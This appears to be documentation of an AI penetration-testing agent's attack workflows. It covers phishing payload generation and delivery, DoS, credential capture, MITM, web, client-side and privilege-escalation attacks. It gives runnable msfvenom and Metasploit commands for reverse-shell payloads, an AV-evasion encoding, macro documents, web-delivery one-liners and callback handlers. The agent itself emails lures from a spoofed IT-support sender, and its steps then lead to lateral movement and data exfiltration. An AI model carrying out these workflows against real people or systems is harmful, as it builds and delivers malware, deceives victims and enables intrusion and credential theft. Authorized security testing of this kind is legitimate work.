**Description**: Attacks targeting human factors rather than technical vulnerabilities. Instead of exploiting a software bug directly, the agent generates malicious payloads, documents, or delivery mechanisms that require a human to execute — opening a file, clicking a link, or running a command. This is a **human-in-the-loop** attack path: the attacker crafts the bait, but the victim's action triggers the payload callback.

**Entry Detection Keywords**: `phish`, `phishing`, `social engineering`, `spear phishing`, `payload generation`, `malicious document`, `macro`, `msfvenom`, `trojan`, `dropper`, `email attack`, `fake email`, `web delivery`, `hta`, `office macro`, `backdoor`, `implant`, `campaign`, `lure`, `bait`, `send email`, `craft email`, `generate payload`, `malicious file`, `reverse shell payload`, `create backdoor`

**Key Difference from CVE Exploit**: CVE exploitation targets a software vulnerability directly — the agent fires the exploit and the vulnerable service is compromised automatically. Phishing/social engineering targets a _person_ — the agent generates a weaponized artifact and delivers it, but a human must execute it for the attack to succeed.

### How It Works: The 6-Step Workflow

The agent follows a mandatory 6-step workflow when classified as `phishing_social_engineering`:

```
┌─────────────────────────────────────────────────────────────────────────┐
│              PHISHING / SOCIAL ENGINEERING WORKFLOW                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Step 1: DETERMINE TARGET PLATFORM & DELIVERY METHOD                    │
│    ├── Target OS: Windows / Linux / macOS / Android / Multi-platform    │
│    └── Method: A) Standalone Payload  B) Malicious Document             │
│                C) Web Delivery        D) HTA Delivery                   │
│                                                                          │
│  Step 2: SET UP HANDLER (always — runs in background)                   │
│    └── exploit/multi/handler + matching payload + LHOST/LPORT + run -j  │
│                                                                          │
│  Step 3: GENERATE PAYLOAD / DOCUMENT (choose one method)                │
│    ├── A: msfvenom → exe/elf/apk/ps1/vba/hta-psh/war/macho/raw        │
│    ├── B: Metasploit fileformat → Word/Excel/PDF/RTF/LNK               │
│    ├── C: web_delivery → Python/PHP/PSH/Regsvr32/pubprn one-liner      │
│    └── D: hta_server → URL the target opens in browser                  │
│                                                                          │
│  Step 4: VERIFY PAYLOAD WAS GENERATED                                   │
│    └── ls -la, file command, jobs check                                  │
│                                                                          │
│  Step 5: DELIVER TO TARGET                                               │
│    ├── Chat download: report path + docker cp command                   │
│    ├── Email: execute_code with Python smtplib (SMTP config from        │
│    │          project settings or asked at runtime)                      │
│    └── Web link: report one-liner (Method C) or URL (Method D)          │
│                                                                          │
│  Step 6: WAIT FOR CALLBACK & VERIFY SESSION                             │
│    └── sessions -l → if session opens → post_exploitation               │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 3.1 Method A: Standalone Payload (msfvenom)

Generate a binary, script, or APK that the target executes directly. Uses `msfvenom` via the `kali_shell` tool.

**Payload + Format Matrix:**

| Target OS | Payload | Format (`-f`) | Output | Notes |
|-----------|---------|---------------|--------|-------|
| Windows | `windows/meterpreter/reverse_tcp` | `exe` | `payload.exe` | Most common |
| Windows | `windows/meterpreter/reverse_https` | `exe` | `payload.exe` | Encrypted, firewall bypass |
| Windows | `windows/shell_reverse_tcp` | `exe` | `shell.exe` | Fallback if meterpreter fails |
| Windows | `windows/meterpreter/reverse_tcp` | `psh` | `payload.ps1` | PowerShell script (fileless) |
| Windows | `windows/meterpreter/reverse_tcp` | `psh-reflection` | `payload.ps1` | Reflective PS (AV evasion) |
| Windows | `windows/meterpreter/reverse_tcp` | `vba` | `payload.vba` | VBA macro code for Office |
| Windows | `windows/meterpreter/reverse_tcp` | `hta-psh` | `payload.hta` | HTA with embedded PowerShell |
| Linux | `linux/x64/meterpreter/reverse_tcp` | `elf` | `payload.elf` | Standard ELF binary |
| Linux | `cmd/unix/reverse_bash` | `raw` | `payload.sh` | Bash one-liner |
| Linux | `cmd/unix/reverse_python` | `raw` | `payload.py` | Python one-liner |
| macOS | `osx/x64/meterpreter/reverse_tcp` | `macho` | `payload.macho` | Mach-O binary |
| Android | `android/meterpreter/reverse_tcp` | `raw` | `payload.apk` | Android APK |
| Java/Web | `java/meterpreter/reverse_tcp` | `war` | `payload.war` | WAR for Tomcat/JBoss |
| Multi | `python/meterpreter/reverse_tcp` | `raw` | `payload.py` | Cross-platform Python |

**Example command:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o /tmp/payload.exe
```

**AV evasion (optional encoding):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/payload_encoded.exe
```

### 3.2 Method B: Malicious Document (Metasploit Fileformat Modules)

Generate weaponized Office, PDF, RTF, or LNK files via Metasploit fileformat modules. These exploit vulnerabilities or macros in document readers to execute a payload when the target opens the file.

| # | File Type | Description | Metasploit Module |
|---|-----------|-------------|-------------------|
| 1 | **Word Macro (.docm)** | VBA macro payload embedded in Word document | `exploit/multi/fileformat/office_word_macro` |
| 2 | **Excel Macro (.xlsm)** | VBA macro payload embedded in Excel spreadsheet | `exploit/multi/fileformat/office_excel_macro` |
| 3 | **PDF (Adobe Reader)** | PDF with embedded executable payload | `exploit/windows/fileformat/adobe_pdf_embedded_exe` |
| 4 | **RTF (CVE-2017-0199)** | RTF that fetches an HTA payload when opened | `exploit/windows/fileformat/office_word_hta` |
| 5 | **LNK Shortcut** | Malicious Windows shortcut file | `exploit/windows/fileformat/lnk_shortcut_ftype_append` |

**Critical: Output location** — All fileformat modules save output to `/root/.msf4/local/<FILENAME>`. The agent always copies the file to `/tmp/` for easier access.

**Example (Word macro):**
```
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set FILENAME malicious.docm
run
```

### 3.3 Method C: Web Delivery (Fileless)

Host a payload on the attacker's web server and generate a one-liner command that the target pastes into a terminal. The payload runs in memory — no file touches disk, making this more stealthy than file-based methods.

| TARGET # | Language | One-liner runs on | Best for |
|----------|----------|-------------------|----------|
| 0 | Python | Linux/macOS/Win with Python | Cross-platform targets |
| 1 | PHP | Web servers with PHP | Compromised web servers |
| 2 | PSH (PowerShell) | Windows | Standard Windows targets |
| 3 | Regsvr32 | Windows | AppLocker bypass |
| 4 | pubprn | Windows | Script execution bypass |
| 5 | SyncAppvPublishingServer | Windows | App-V bypass |
| 6 | PSH Binary | Windows | Binary via PowerShell |

**Example:**
```
use exploit/multi/script/web_delivery
set TARGET 2
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set SRVHOST 0.0.0.0
set SRVPORT 8080
run -j
```
The module prints a one-liner command — that IS the delivery payload. The web server runs as a background job until the target executes it.

### 3.4 Method D: HTA Delivery Server

Host an HTA (HTML Application) that executes a payload when opened in a browser. The target must visit the URL or be tricked into opening the `.hta` file.

```
use exploit/windows/misc/hta_server
set PAYLOAD windows/meterpreter_reverse_tcp   # STAGELESS — required when using tunnels (ngrok/chisel)
set LHOST 10.0.0.1
set LPORT 4444
set SRVHOST 0.0.0.0
set SRVPORT 8080
run -j
```
The module prints a URL like `http://10.0.0.1:8080/random.hta`. Delivery scenarios: embed in a phishing email, redirect from a compromised page, or social-engineer the target into visiting.

> **Tunnel note:** HTA delivery requires SRVPORT (8080) to be reachable by the victim. With **chisel**, both ports 4444 + 8080 are tunneled — HTA works. With **ngrok**, only port 4444 is tunneled — HTA does NOT work (use Method A or chisel instead). When using any tunnel, you MUST use **stageless** payloads (underscore `_` not slash `/`).

### 3.5 The Handler (Required for All Methods)

Every phishing attack needs a **handler** running in the background to catch the callback when the target executes the payload. The handler MUST use the exact same payload type, LHOST, and LPORT as the generated artifact — mismatched values cause the callback to silently fail.

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_tcp    # Must match the payload in Step 3 (use stageless _ with tunnels)
set LHOST 10.0.0.1                              # Must match LHOST used in generation
set LPORT 4444                                   # Must match LPORT used in generation
run -j                                           # Background job — waits for connection
```

The handler reads LHOST/LPORT from the project's "Pre-Configured Payload Settings" (configured in the Agent Behaviour tab). If a tunnel provider (ngrok or chisel) is enabled, the public endpoint is used automatically. **When using tunnels, always use stageless payloads** (`meterpreter_reverse_tcp` with underscore, not `meterpreter/reverse_tcp` with slash) — staged payloads fail through tunnels.

### 3.6 Delivery Methods

After generating the payload, the agent delivers it through one of three channels:

#### Chat Download (Default)

The agent reports the file path and provides a `docker cp` command for the user to download the file:
```bash
docker cp redamon-kali:/tmp/payload.exe ./payload.exe
```
The user manually sends the file to the target through any channel (email, chat, USB, shared drive).

#### Email Delivery (On Request)

The agent uses `execute_code` with Python `smtplib` to send the payload as an email attachment or embed a link. The agent writes and runs a Python script inside the Kali container that connects to an external SMTP server (Gmail, Outlook, etc.) and sends the email.

**SMTP Configuration**: Stored in the project settings as a free-text field (`PHISHING_SMTP_CONFIG`). The agent reads this when the phishing path is active. Example:
```
SMTP_HOST: smtp.gmail.com
SMTP_PORT: 587
SMTP_USER: pentest@gmail.com
SMTP_PASS: abcd efgh ijkl mnop
SMTP_FROM: it-support@company.com
USE_TLS: true
```

If no SMTP settings are configured, the agent asks the user for SMTP host, port, username, password, sender address, and target email via `action="ask_user"`. It never attempts to send without credentials.

> **Why SMTP?** Email cannot be sent "directly" from the Kali container — modern mail servers reject emails from IP addresses without proper SPF/DKIM/DMARC records. The agent relays through a legitimate SMTP service (Gmail App Passwords, Outlook, SendGrid, etc.) to ensure delivery.

#### Web Delivery Link (Methods C & D)

For web delivery and HTA attacks, the "payload" is a URL or one-liner command. The agent reports it in the chat — no file transfer needed.

### 3.7 Social Engineering Module Reference

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 1 | **Multi Handler** | Generic payload handler for callbacks | `exploit/multi/handler` |
| 2 | **Web Delivery (Python)** | Python-based payload delivery | `exploit/multi/script/web_delivery` (TARGET 0) |
| 3 | **Web Delivery (PowerShell)** | PowerShell-based payload delivery | `exploit/multi/script/web_delivery` (TARGET 2) |
| 4 | **Web Delivery (Regsvr32)** | COM scriptlet delivery (AppLocker bypass) | `exploit/multi/script/web_delivery` (TARGET 3) |
| 5 | **HTA Delivery** | HTML Application delivery | `exploit/windows/misc/hta_server` |
| 6 | **Office Macro Payload** | Malicious Office document | `exploit/multi/fileformat/office_*` |
| 7 | **PDF Exploit** | Malicious PDF file | `exploit/windows/fileformat/adobe_pdf_*` |
| 8 | **USB Rubber Ducky** | BadUSB HID attacks | Payload generation with msfvenom |
| 9 | **Fake Update Page** | Browser fake update | `auxiliary/server/browser_autopwn2` |
| 10 | **DNS Hijack Phishing** | Redirects to fake pages | Combine with `auxiliary/spoof/dns/*` |

### 3.8 Post-Exploitation

When the target executes the payload and the handler catches the callback, a Meterpreter session opens. The agent then requests transition to `post_exploitation` phase — identical to CVE exploit post-exploitation (interactive session commands, enumeration, lateral movement, data exfiltration).

If no session opens after delivery, the agent:
1. Verifies handler is running (`jobs` in metasploit_console)
2. Checks payload/handler match (same type, LHOST, LPORT)
3. Tries a different payload format if the platform was wrong
4. Asks the user if the target has executed the payload
5. **Stops after 3 failed attempts** and asks the user for guidance

### Implementation Files

| File | Purpose |
|------|---------|
| `agentic/prompts/phishing_social_engineering_prompts.py` | Full 6-step workflow prompts, payload format guidance, troubleshooting table |
| `agentic/prompts/classification.py` | LLM classification keywords and 10 example requests for phishing routing |
| `agentic/prompts/__init__.py` | Routing branch in `get_phase_tools()` — injects phishing prompts + SMTP config |
| `agentic/state.py` | `phishing_social_engineering` in `KNOWN_ATTACK_PATHS` set |
| `agentic/project_settings.py` | `PHISHING_SMTP_CONFIG` default setting + API field mapping |
| `webapp/prisma/schema.prisma` | `phishingSmtpConfig` database field |
| `webapp/src/components/projects/ProjectForm/sections/PhishingSection.tsx` | SMTP configuration textarea in project settings UI |
| `webapp/src/app/graph/components/AIAssistantDrawer/AIAssistantDrawer.tsx` | Pink "PHISH" badge in AI agent drawer |

---

## Category 4: Denial of Service (DoS)

**Description**: Attacks that disrupt availability rather than gain access.

**Entry Detection Keywords**: `dos`, `denial`, `crash`, `disrupt`, `availability`, `slowloris`, `flood`, `exhaust`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              DoS ATTACK CHAIN                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. use auxiliary/dos/<protocol>/<module>                       │
│  2. show options                                                 │
│  3. set RHOSTS <target>                                          │
│  4. set RPORT <port>                                             │
│  5. (Module-specific options)                                    │
│  6. run                                                          │
│                                                                  │
│  ** NO POST-EXPLOITATION - Mark complete after run **           │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Post-Exploitation**: **NONE** - DoS attacks don't provide access

### 4.1 HTTP/Web DoS

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 1 | **Slowloris** | Keeps connections open exhausting server | `auxiliary/dos/http/slowloris` |
| 2 | **Apache Range DoS** | Range header byte-range attack | `auxiliary/dos/http/apache_range_dos` |
| 3 | **Apache mod_isapi DoS** | Apache module crash | `auxiliary/dos/http/apache_mod_isapi` |
| 4 | **IIS HTTP Request DoS** | IIS-specific DoS | `auxiliary/dos/http/ms15_034_ulonglongadd` |
| 5 | **Hashcollision DoS** | Hash table collision | `auxiliary/dos/http/hashcollision_dos` |

### 4.2 Network Protocol DoS

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 6 | **TCP SYN Flood** | SYN packet flood | `auxiliary/dos/tcp/synflood` |
| 7 | **UDP Flood** | UDP packet flood | `auxiliary/dos/udp/udp_flood` |
| 8 | **ICMP Flood** | Ping flood | `auxiliary/dos/icmp/icmp_flood` |
| 9 | **Smurf Attack** | ICMP broadcast amplification | `auxiliary/dos/icmp/smurf` |

### 4.3 Service-Specific DoS

| # | Attack Type | Description | CVE/MS | Metasploit Module |
|---|-------------|-------------|--------|-------------------|
| 10 | **RDP MS12-020** | RDP pre-auth DoS | MS12-020 | `auxiliary/dos/windows/rdp/ms12_020_maxchannelids` |
| 11 | **SMB DoS** | SMB service crash | Various | `auxiliary/dos/windows/smb/ms*` |
| 12 | **FTP DoS** | FTP service crash | Various | `auxiliary/dos/ftp/*` |
| 13 | **SSH DoS** | SSH service exhaustion | Various | `auxiliary/dos/ssh/*` |
| 14 | **DNS Amplification** | DNS response amplification | N/A | `auxiliary/dos/dns/*` |
| 15 | **SNMP DoS** | SNMP service crash | Various | `auxiliary/dos/snmp/*` |

---

## Category 5: Fuzzing / Vulnerability Discovery

**Description**: Send malformed input to discover new vulnerabilities.

**Entry Detection Keywords**: `fuzz`, `crash`, `discover`, `overflow`, `mutation`, `test input`, `bug hunting`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              FUZZING CHAIN                                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. use auxiliary/fuzzers/<protocol>/<fuzzer>                   │
│  2. show options                                                 │
│  3. set RHOSTS <target>                                          │
│  4. set RPORT <port>                                             │
│  5. (Fuzzer-specific options like STARTSIZE, ENDSIZE, FIELDS)   │
│  6. run                                                          │
│  7. Monitor target for crashes/anomalies                        │
│                                                                  │
│  ** NO POST-EXPLOITATION - Chain to CVE research if found **    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

**Post-Exploitation**: **NONE** - Fuzzing is reconnaissance, not exploitation

### 5.1 Protocol Fuzzers

| # | Protocol | Description | Metasploit Module |
|---|----------|-------------|-------------------|
| 1 | **HTTP Header Fuzzer** | Fuzz HTTP headers | `auxiliary/fuzzers/http/http_form_field` |
| 2 | **HTTP Cookie Fuzzer** | Fuzz HTTP cookies | `auxiliary/fuzzers/http/http_cookie` |
| 3 | **FTP Fuzzer** | Fuzz FTP commands | `auxiliary/fuzzers/ftp/ftp_pre_post` |
| 4 | **SSH Fuzzer** | Fuzz SSH key exchange | `auxiliary/fuzzers/ssh/ssh_kexinit_corrupt` |
| 5 | **SMB Fuzzer** | Fuzz SMB negotiation | `auxiliary/fuzzers/smb/smb_negotiate_corrupt` |
| 6 | **DNS Fuzzer** | Fuzz DNS queries/responses | `auxiliary/fuzzers/dns/dns_fuzzer` |
| 7 | **SMTP Fuzzer** | Fuzz SMTP commands | `auxiliary/fuzzers/smtp/smtp_fuzzer` |
| 8 | **TLS/SSL Fuzzer** | Fuzz TLS handshake | `auxiliary/fuzzers/tls/tls_record_fuzzer` |

---

## Category 6: Credential Capture / MITM

**Description**: Passive or active credential harvesting via fake services or network interception.

**Entry Detection Keywords**: `capture`, `harvest`, `intercept`, `sniff`, `mitm`, `relay`, `ntlm`, `hash`, `responder`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              CREDENTIAL CAPTURE CHAIN                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  === Step 1: Set up capture server ===                          │
│                                                                  │
│  1a. SMB Hash Capture:                                           │
│      use auxiliary/server/capture/smb                           │
│      set SRVHOST 0.0.0.0                                         │
│      set JOHNPWFILE /tmp/smb_hashes                             │
│      run -j                                                      │
│                                                                  │
│  1b. HTTP NTLM Capture:                                          │
│      use auxiliary/server/capture/http_ntlm                     │
│      set SRVHOST 0.0.0.0                                         │
│      set SRVPORT 8080                                            │
│      set JOHNPWFILE /tmp/http_hashes                            │
│      run -j                                                      │
│                                                                  │
│  === Step 2: Force authentication (optional) ===                │
│                                                                  │
│  2a. NBNS Spoofing (to redirect queries):                       │
│      use auxiliary/spoof/nbns/nbns_response                     │
│      set SPOOFIP <attacker_ip>                                   │
│      set REGEX .*                                                │
│      run -j                                                      │
│                                                                  │
│  2b. Or embed UNC path in document/email:                       │
│      \\<attacker_ip>\share\file.txt                             │
│                                                                  │
│  === Step 3: Crack captured hashes ===                          │
│                                                                  │
│  john --wordlist=/path/to/wordlist /tmp/smb_hashes              │
│  hashcat -m 5600 /tmp/smb_hashes /path/to/wordlist              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 6.1 Credential Capture Servers

| # | Protocol | Description | Metasploit Module |
|---|----------|-------------|-------------------|
| 1 | **SMB Hash Capture** | Captures NTLMv1/v2 hashes | `auxiliary/server/capture/smb` |
| 2 | **HTTP NTLM Capture** | Captures HTTP NTLM authentication | `auxiliary/server/capture/http_ntlm` |
| 3 | **HTTP Basic Capture** | Captures HTTP Basic auth credentials | `auxiliary/server/capture/http_basic` |
| 4 | **FTP Credential Capture** | Captures FTP credentials | `auxiliary/server/capture/ftp` |
| 5 | **IMAP Capture** | Captures IMAP credentials | `auxiliary/server/capture/imap` |
| 6 | **POP3 Capture** | Captures POP3 credentials | `auxiliary/server/capture/pop3` |
| 7 | **SMTP Capture** | Captures SMTP credentials | `auxiliary/server/capture/smtp` |
| 8 | **MySQL Capture** | Captures MySQL credentials | `auxiliary/server/capture/mysql` |
| 9 | **PostgreSQL Capture** | Captures PostgreSQL credentials | `auxiliary/server/capture/postgresql` |
| 10 | **VNC Capture** | Captures VNC authentication | `auxiliary/server/capture/vnc` |

### 6.2 Active Directory Credential Attacks

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 11 | **Pass-the-Hash (PtH)** | Reuses NTLM hashes for authentication | `exploit/windows/smb/psexec` |
| 12 | **Pass-the-Ticket (PtT)** | Reuses Kerberos tickets | Mimikatz post module |
| 13 | **Kerberoasting** | Extracts service account password hashes | `auxiliary/gather/kerberos_enumusers` |
| 14 | **AS-REP Roasting** | Attacks accounts without pre-auth | `auxiliary/gather/asrep_roast` |
| 15 | **DCSync Attack** | Replicates domain credentials | `post/windows/gather/credentials/domain_hashdump` |
| 16 | **Mimikatz Integration** | Dumps credentials from memory | `post/windows/gather/credentials/credential_collector` |
| 17 | **LLMNR/NBT-NS Poisoning** | Captures hashes via name resolution | `auxiliary/spoof/llmnr/llmnr_response` |
| 18 | **mDNS Poisoning** | Multicast DNS poisoning | `auxiliary/spoof/mdns/mdns_response` |
| 19 | **WPAD Spoofing** | Web Proxy Auto-Discovery spoofing | `auxiliary/server/wpad` |
| 20 | **NTLM Relay Attacks** | Relays authentication to other services | `exploit/windows/smb/smb_relay` |

### 6.3 Network Sniffing

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 21 | **Psnuffle (Password Sniffer)** | Sniffs passwords from network traffic | `auxiliary/sniffer/psnuffle` |

---

## Category 7: Wireless / Network Attacks

**Description**: Attacks targeting wireless networks and network infrastructure.

**Entry Detection Keywords**: `wireless`, `wifi`, `arp`, `spoof`, `poison`, `mitm`, `network`, `rogue`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              ARP POISONING CHAIN                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. use auxiliary/spoof/arp/arp_poisoning                       │
│  2. set INTERFACE eth0                                           │
│  3. set DHOSTS <target_ip>        (victim)                      │
│  4. set SHOSTS <gateway_ip>       (router)                      │
│  5. set BIDIRECTIONAL true                                       │
│  6. run -j                                                       │
│                                                                  │
│  Then combine with credential capture or traffic analysis       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 7.1 Network Spoofing Attacks

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 1 | **ARP Poisoning** | Man-in-the-middle via ARP cache poisoning | `auxiliary/spoof/arp/arp_poisoning` |
| 2 | **NBNS Response Spoofing** | NetBIOS name resolution spoofing | `auxiliary/spoof/nbns/nbns_response` |
| 3 | **LLMNR Response Spoofing** | Link-Local Multicast Name Resolution spoofing | `auxiliary/spoof/llmnr/llmnr_response` |
| 4 | **mDNS Spoofing** | Multicast DNS spoofing | `auxiliary/spoof/mdns/mdns_response` |
| 5 | **DNS Spoofing** | DNS response spoofing | `auxiliary/spoof/dns/dns_spoof` |
| 6 | **DHCP Spoofing** | Rogue DHCP server | `auxiliary/server/dhcp` |

### 7.2 SNMP Exploitation

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 7 | **SNMP Community String Scan** | Discovers SNMP community strings | `auxiliary/scanner/snmp/snmp_login` |
| 8 | **SNMP Enumeration** | Enumerates system info via SNMP | `auxiliary/scanner/snmp/snmp_enum` |
| 9 | **SNMP Set Exploitation** | Exploits writable SNMP OIDs | `auxiliary/scanner/snmp/snmp_set` |

### 7.3 Rogue Services

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 10 | **Rogue DHCP Server** | Issues malicious DHCP leases | `auxiliary/server/dhcp` |
| 11 | **Rogue DNS Server** | Responds to DNS queries with malicious IPs | `auxiliary/server/fakedns` |
| 12 | **Rogue HTTP Proxy** | Intercepts HTTP traffic | `auxiliary/server/http_proxy` |

---

## Category 8: Web Application Attacks

**Description**: Attacks specifically targeting web applications (beyond CVE-based exploits).

**Entry Detection Keywords**: `web`, `http`, `sql injection`, `xss`, `sqli`, `directory`, `traversal`, `lfi`, `rfi`, `upload`

### 8.1 Web Application Exploits

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 1 | **SQL Injection (SQLi)** | Extracts data or executes commands via database queries | `auxiliary/sqli/*` |
| 2 | **Local File Inclusion (LFI)** | Reads arbitrary files from the server | `exploit/unix/webapp/*_lfi` |
| 3 | **Remote File Inclusion (RFI)** | Includes and executes remote malicious scripts | `exploit/unix/webapp/*_rfi` |
| 4 | **XML External Entity (XXE)** | Exploits XML parsers to read files or perform SSRF | `exploit/multi/http/*_xxe*` |
| 5 | **Server-Side Request Forgery (SSRF)** | Forces server to make requests to internal resources | Various webapp modules |
| 6 | **File Upload RCE** | Uploads malicious files (webshells) to gain execution | `exploit/multi/http/*_upload` |
| 7 | **WebDAV Exploitation** | Exploits misconfigured WebDAV to upload and execute code | `exploit/windows/iis/iis_webdav_upload_asp` |
| 8 | **PHP CGI Argument Injection** | Passes malicious arguments to PHP | `exploit/multi/http/php_cgi_arg_injection` |
| 9 | **Tomcat Manager Upload** | Uses default/weak credentials to deploy malicious WAR | `exploit/multi/http/tomcat_mgr_upload` |
| 10 | **JBoss JMX Console RCE** | Deploys malicious applications via JMX | `exploit/multi/http/jboss_*` |

### 8.2 Web Scanning and Enumeration

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 11 | **Directory Enumeration** | Brute forces directories and files | `auxiliary/scanner/http/dir_scanner` |
| 12 | **File Enumeration** | Discovers hidden files | `auxiliary/scanner/http/files_dir` |
| 13 | **Web App Version Detection** | Identifies CMS and framework versions | `auxiliary/scanner/http/http_version` |
| 14 | **HTTP Method Enumeration** | Tests allowed HTTP methods | `auxiliary/scanner/http/options` |
| 15 | **Virtual Host Enumeration** | Discovers virtual hosts | `auxiliary/scanner/http/vhost_scanner` |
| 16 | **Robots.txt Scanner** | Parses robots.txt for hidden paths | `auxiliary/scanner/http/robots_txt` |
| 17 | **Backup File Scanner** | Finds backup files (.bak, .old, etc.) | `auxiliary/scanner/http/backup_file` |
| 18 | **HTTP Header Checker** | Analyzes security headers | `auxiliary/scanner/http/http_header` |

### 8.3 CMS-Specific Scanners

| # | CMS | Description | Metasploit Module |
|---|-----|-------------|-------------------|
| 19 | **WordPress Scanner** | WordPress vulnerability scanning | `auxiliary/scanner/http/wordpress_*` |
| 20 | **Joomla Scanner** | Joomla vulnerability scanning | `auxiliary/scanner/http/joomla_*` |
| 21 | **Drupal Scanner** | Drupal vulnerability scanning | `auxiliary/scanner/http/drupal_*` |

---

## Category 9: Client-Side Exploitation

**Description**: Attacks requiring victim interaction (browser, document, media).

**Entry Detection Keywords**: `browser`, `client`, `java`, `flash`, `pdf`, `office`, `document`, `malicious file`, `drive-by`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              CLIENT-SIDE EXPLOIT CHAIN                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. search type:exploit platform:windows target:browser         │
│     or: use exploit/windows/browser/ie_*                        │
│     or: use exploit/multi/browser/java_*                        │
│                                                                  │
│  2. show options                                                 │
│                                                                  │
│  3. set SRVHOST <attacker>                                       │
│  4. set SRVPORT <port>                                           │
│  5. set PAYLOAD windows/meterpreter/reverse_tcp                 │
│  6. set LHOST <attacker>                                         │
│  7. set LPORT <callback_port>                                    │
│                                                                  │
│  8. exploit -j                                                   │
│                                                                  │
│  Output: URL to send to victim                                  │
│  Wait for victim to visit URL in vulnerable browser             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 9.1 Browser Exploits

| # | Browser/Plugin | Description | Metasploit Module |
|---|----------------|-------------|-------------------|
| 1 | **Internet Explorer** | Multiple IE memory corruption exploits | `exploit/windows/browser/ie_*` |
| 2 | **Firefox** | Firefox vulnerabilities | `exploit/multi/browser/firefox_*` |
| 3 | **Chrome** | Chrome vulnerabilities | `exploit/multi/browser/chrome_*` |
| 4 | **Java Applet** | Java browser plugin exploits | `exploit/multi/browser/java_*` |
| 5 | **Adobe Flash** | Flash Player exploits | `exploit/multi/browser/adobe_flash_*` |
| 6 | **Silverlight** | Microsoft Silverlight exploits | `exploit/windows/browser/silverlight_*` |
| 7 | **WebKit** | WebKit engine exploits | `exploit/multi/browser/webkit_*` |

### 9.2 Document-Based Exploits

| # | Document Type | Description | Metasploit Module |
|---|---------------|-------------|-------------------|
| 8 | **PDF (Adobe Reader)** | Adobe Reader exploits | `exploit/windows/fileformat/adobe_*` |
| 9 | **Word Document** | Microsoft Word exploits | `exploit/windows/fileformat/ms*_word_*` |
| 10 | **Excel Document** | Microsoft Excel exploits | `exploit/windows/fileformat/ms*_excel_*` |
| 11 | **PowerPoint** | Microsoft PowerPoint exploits | `exploit/windows/fileformat/ms*_powerpoint_*` |
| 12 | **RTF Document** | RTF format exploits | `exploit/windows/fileformat/office_word_hta` |
| 13 | **HTA File** | HTML Application exploits | `exploit/windows/misc/hta_server` |

### 9.3 Media File Exploits

| # | Media Type | Description | Metasploit Module |
|---|------------|-------------|-------------------|
| 14 | **ImageMagick** | Image processing library exploits | `exploit/unix/fileformat/imagemagick_delegate` |
| 15 | **FFmpeg** | Video processing exploits | Various |
| 16 | **VLC** | VLC media player exploits | `exploit/windows/fileformat/vlc_*` |

### 9.4 Browser Autopwn

| # | Attack Type | Description | Metasploit Module |
|---|-------------|-------------|-------------------|
| 17 | **Browser Autopwn** | Automatic browser exploit selection | `auxiliary/server/browser_autopwn2` |

---

## Category 10: Local Privilege Escalation

**Description**: Attacks executed AFTER initial access to escalate privileges.

**Entry Detection Keywords**: `privilege`, `escalate`, `root`, `system`, `sudo`, `local`, `kernel`, `privesc`

**Workflow**:
```
┌─────────────────────────────────────────────────────────────────┐
│              LOCAL PRIVESC CHAIN                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Prerequisites: Already have a Meterpreter/shell session        │
│                                                                  │
│  === Option A: Built-in getsystem (Windows) ===                 │
│  meterpreter > getsystem                                         │
│                                                                  │
│  === Option B: Local exploit module ===                         │
│  1. background                    (background current session)  │
│  2. search type:exploit platform:linux local                    │
│  3. use exploit/linux/local/dirty_pipe                          │
│  4. set SESSION <session_id>                                     │
│  5. set LHOST <attacker>                                         │
│  6. set LPORT <new_port>                                         │
│  7. exploit                                                      │
│                                                                  │
│  === Option C: Post module suggestion ===                       │
│  1. run post/multi/recon/local_exploit_suggester                │
│  2. Review suggested exploits                                    │
│  3. Run appropriate local exploit                               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 10.1 Linux Privilege Escalation

| # | Attack Type | Description | CVE | Metasploit Module |
|---|-------------|-------------|-----|-------------------|
| 1 | **Dirty Pipe** | Linux kernel pipe buffer overflow | CVE-2022-0847 | `exploit/linux/local/cve_2022_0847_dirtypipe` |
| 2 | **Dirty COW** | Linux kernel copy-on-write race | CVE-2016-5195 | `exploit/linux/local/dirtycow` |
| 3 | **Baron Samedit (Sudo)** | Sudo heap overflow | CVE-2021-3156 | `exploit/linux/local/sudo_baron_samedit` |
